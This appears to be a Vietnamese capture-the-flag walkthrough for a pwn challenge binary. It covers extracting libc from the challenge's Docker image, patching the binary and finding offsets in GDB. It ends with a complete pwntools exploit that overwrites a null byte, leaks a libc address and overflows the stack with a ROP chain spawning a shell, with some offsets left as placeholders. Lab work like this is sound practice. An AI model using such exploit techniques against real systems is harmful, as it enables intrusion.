Tuyệt vời! Việc có `Dockerfile` là một lợi thế cực lớn. Nó giúp chúng ta tạo ra môi trường giống hệt server (đặc biệt là phiên bản **Libc**) để debug chính xác offset và các địa chỉ gadget.

Dưới đây là quy trình từng bước để tận dụng Dockerfile cho việc debug và exploit bài này.

### Bước 1: Trích xuất Libc và Linker từ Docker

Vì đề bài dùng `ubuntu:25.10` (phiên bản rất mới/tương lai), file `libc.so.6` trên máy bạn chắc chắn sẽ khác offset với server. Chúng ta cần lấy file đó ra.

1.  **Build Docker Image:**
    Tại thư mục chứa `Dockerfile.txt` và `chal`:
    ```bash
    # Đổi tên Dockerfile.txt thành Dockerfile nếu cần
    mv Dockerfile.txt Dockerfile
    docker build -t unexpected_chal .
    ```

2.  **Tạo container tạm và copy file:**
    ```bash
    # Tạo container nhưng không cần chạy
    docker create --name temp_chal unexpected_chal

    # Copy libc và ld (linker) ra ngoài
    # Lưu ý: Đường dẫn có thể thay đổi tùy distro, nhưng với Ubuntu mới thường là:
    docker cp temp_chal:/srv/lib/x86_64-linux-gnu/libc.so.6 .
    docker cp temp_chal:/srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .

    # Xóa container tạm
    docker rm temp_chal
    ```

### Bước 2: Patch Binary để Debug local

Để GDB nạp đúng thư viện libc vừa lấy được, bạn nên dùng công cụ `pwninit` hoặc `patchelf`.

*   **Cách dùng pwninit (Khuyên dùng):**
    ```bash
    # Tải pwninit nếu chưa có, sau đó chạy:
    pwninit --bin chal --libc libc.so.6 --ld ld-linux-x86-64.so.2
    ```
    Nó sẽ tạo ra file `chal_patched`. Bạn sẽ debug trên file này.

*   **Cách thủ công (nếu không có pwninit):**
    ```bash
    patchelf --set-interpreter ./ld-linux-x86-64.so.2 chal
    patchelf --replace-needed libc.so.6 ./libc.so.6 chal
    mv chal chal_patched
    ```

### Bước 3: Debug bằng GDB để tìm Offset

Bây giờ hãy dùng GDB trên file `chal_patched`. Mục tiêu là xác định xem biến `choice` nằm ở đâu so với `user.name` để ghi đè Null byte.

1.  **Mở GDB:**
    ```bash
    gdb ./chal_patched
    ```

2.  **Đặt Breakpoint:**
    Đặt breakpoint ngay sau khi nhập `choice` (lệnh `scanf`). Bạn có thể disassemble hàm `vuln` để tìm địa chỉ, hoặc đơn giản là break tại `vuln` rồi step qua.
    ```gdb
    b *vuln
    run
    ```

3.  **Thao tác trong chương trình (khi đang chạy GDB):**
    *   Nhập Login Name: 255 ký tự 'A'.
    *   Nhập Login Pass: 255 ký tự 'B'.
    *   Chương trình sẽ in "Hello ...".
    *   Đến đoạn nhập lựa chọn (`scanf`), nhập `-1` (hoặc một số để ghi đè byte cuối).

4.  **Kiểm tra bộ nhớ (Quan trọng):**
    Ngay sau khi nhập `-1`, hãy dừng lại và kiểm tra stack.
    ```gdb
    # Tìm địa chỉ của chuỗi AAAAA...
    search -s "AAAA"
    
    # Giả sử địa chỉ tìm thấy là 0x7fffffffe100
    # Xem bộ nhớ tại đó
    x/300bx 0x7fffffffe100
    ```
    
    **Dấu hiệu thành công:** Bạn sẽ thấy chuỗi 'A' (0x41), kết thúc lẽ ra là `0x00` nhưng bị ghi đè bởi `0xff` (do nhập -1) hoặc một byte khác của biến `choice`. Nếu mất `0x00`, `strlen` sẽ chạy tuốt sang chuỗi 'B' và xa hơn nữa.

5.  **Tìm Offset Libc:**
    Khi chương trình in lại "Hello [Name]", nó sẽ leak dữ liệu. Hãy xem giá trị leak đó trong GDB.
    *   Lấy địa chỉ leak được (ví dụ `0x7ffff7c29d90`).
    *   Lấy địa chỉ base của libc trong GDB: `vmmap` (hoặc `info proc mappings`).
    *   `Offset = Leak_Address - Libc_Base`.
    *   Ghi lại offset này để dùng trong code Python.

### Bước 4: Script Exploit hoàn chỉnh (cập nhật)

Đây là script đã tối ưu cho việc có file Libc:

```python
from pwn import *

# Cấu hình
exe = './chal_patched' # Dùng file đã patch
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6', checksec=False) # Load libc lấy từ docker

# context.log_level = 'debug'

def start():
    if args.GDB:
        return gdb.debug(exe, '''
            b *vuln+250 
            # Chỉnh offset 250 sao cho trúng đoạn sau scanf
            continue
        ''')
    else:
        return process(exe)

p = start()

# --- GIAI ĐOẠN 1: Ghi đè Null Byte ---

# Name: 255 'A' -> user.name full, byte cuối là \0
# Pass: 255 'B' -> user.pass full
p.sendlineafter(b'information: ', b'A'*255 + b':' + b'B'*255)

# Gửi choice = -1 (0xFFFFFFFF)
# Hy vọng biến choice nằm đè lên byte null cuối cùng của user.name
# hoặc nằm ngay trước user.pass
p.sendlineafter(b'Hello ', b'-1')

# --- GIAI ĐOẠN 2: Leak Libc ---

p.recvuntil(b'Hello ')
leak_data = p.recvline().strip()

# Dữ liệu leak sẽ là: [255 bytes A] + [Overwrite bytes] + [255 bytes B] + [Rác Stack] + [LIBC LEAK]
# Tổng struct User là 512 bytes.
# Ta cần lọc lấy địa chỉ sau struct User.
if len(leak_data) > 512:
    # Cắt bỏ phần user struct
    stack_leak = leak_data[512:]
    
    # Tìm địa chỉ 64-bit (8 bytes) có vẻ giống Libc
    # Thường địa chỉ Ret nằm cách một đoạn rác.
    # Bạn có thể cần debug để chỉnh index [8:16] này cho chuẩn
    leak_val = u64(stack_leak[8:16].ljust(8, b'\0')) 
    log.info(f"Leaked raw value: {hex(leak_val)}")
    
    # Tính toán Base Libc
    # Offset này BẮT BUỘC phải tìm bằng GDB như hướng dẫn ở Bước 3
    # Ví dụ: leak là __libc_start_main_ret
    # libc.address = leak_val - libc.symbols['__libc_start_main'] - 128 (hoặc 243...)
    
    # Cách tìm offset nhanh bằng pwntools nếu biết leak là gì (thường là return về __libc_start_main):
    # Giả sử leak trỏ về sau lệnh call main trong libc
    libc.address = leak_val - 0x29d90 # <--- THAY SỐ NÀY SAU KHI DEBUG
    log.success(f"Libc Base: {hex(libc.address)}")
else:
    log.error("Không leak được dữ liệu. Kiểm tra lại việc ghi đè Null byte.")
    exit()

# --- GIAI ĐOẠN 3: Buffer Overflow & ROP ---

# Chọn option 1 (đổi tên) để kích hoạt fgets với size khổng lồ (do strlen lỗi)
p.sendline(b'1')

# Xây dựng ROP Chain
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret'])) # Stack alignment (quan trọng trên Ubuntu mới)
rop.system(next(libc.search(b'/bin/sh')))

# Payload:
# Lấp đầy Name (256) + Pass (256) + Saved RBP (8) + ROP
payload = b'A' * 256 + b'B' * 256 + b'C'*8 + rop.chain()

p.sendlineafter(b'New name: ', payload)

p.interactive()
```

### Mẹo Debug Offset nhanh:
Trong GDB, khi chương trình crash hoặc dừng ở breakpoint sau khi leak, hãy gõ:
`info symbol <địa chỉ leak được>`
GDB sẽ nói cho bạn biết địa chỉ đó là hàm nào + bao nhiêu (ví dụ: `__libc_start_call_main + 128`). Bạn lấy số đó trừ đi để ra offset chính xác.